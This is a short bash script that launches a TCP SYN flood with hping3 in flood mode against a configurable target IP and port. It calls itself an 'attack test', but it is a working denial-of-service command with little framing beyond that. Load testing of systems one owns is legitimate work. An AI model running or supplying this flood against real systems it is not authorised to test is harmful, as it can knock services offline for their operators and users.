#!/bin/bash

# Define the target IP and port
TARGET_IP="127.0.0.1"   # Replace with the actual target IP
TARGET_PORT=80          # Replace with the target port

# Run the TCP SYN flood attack test using hping3
echo "Starting TCP SYN flood attack test on $TARGET_IP:$TARGET_PORT..."
sudo hping3 -S --flood -p $TARGET_PORT $TARGET_IP

echo "Test completed."
